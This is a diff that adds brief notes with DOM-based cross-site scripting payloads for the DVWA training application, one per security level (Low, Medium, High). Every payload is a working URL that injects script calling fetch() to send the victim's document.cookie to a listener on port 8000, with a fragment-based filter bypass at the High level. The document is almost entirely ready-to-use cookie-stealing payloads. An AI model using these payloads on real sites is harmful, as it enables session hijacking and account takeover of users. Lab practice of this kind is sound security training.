@@ -1,0 +1,15 @@
+Low 
+    http://localhost/DVWA/vulnerabilities/xss_d/?default=English<script>fetch('http://localhost:8000/'+document.cookie)</script>
+
+    With a server running somewhere
+
+Medium
+    http://localhost/DVWA/vulnerabilities/xss_d/?default=English</select><iframe src="javascript:fetch('http://localhost:8000/'+document.cookie)">
+
+    With a server running somewhere
+
+High
+    http://localhost/DVWA/vulnerabilities/xss_d/?default=English#%3Cscript%3Efetch('http://localhost:8000/'+document.cookie)%3C/script%3E
+    Anything after # does not get sent to server side 
+
+    With a server running somewhere
